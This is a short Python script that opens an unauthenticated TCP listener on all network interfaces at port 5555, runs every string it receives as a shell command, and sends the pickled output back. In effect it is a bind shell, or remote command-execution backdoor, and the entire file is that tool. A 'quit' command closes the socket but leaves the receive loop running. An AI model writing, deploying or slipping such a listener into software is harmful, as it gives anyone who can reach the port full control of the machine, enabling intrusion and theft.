from socket import *
from subprocess import getstatusoutput
from pickle import dumps

def server(ip : str):
    serve = socket(AF_INET, SOCK_STREAM)
    serve.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    serve.bind((ip, 5555))
    serve.listen(1)
    conn, addr = serve.accept()

    if conn:
        #print('connected to address ' + str(addr))

        while True:
            data = conn.recv(1024)
            command = data.decode('utf-8')
            
            if command.strip() == 'quit':
                #conn.send(b'disconnecting...')
                conn.close()

            else:
                info = getstatusoutput(command)
                conn.send(dumps(info))

if __name__ == '__main__':
    server('0.0.0.0')
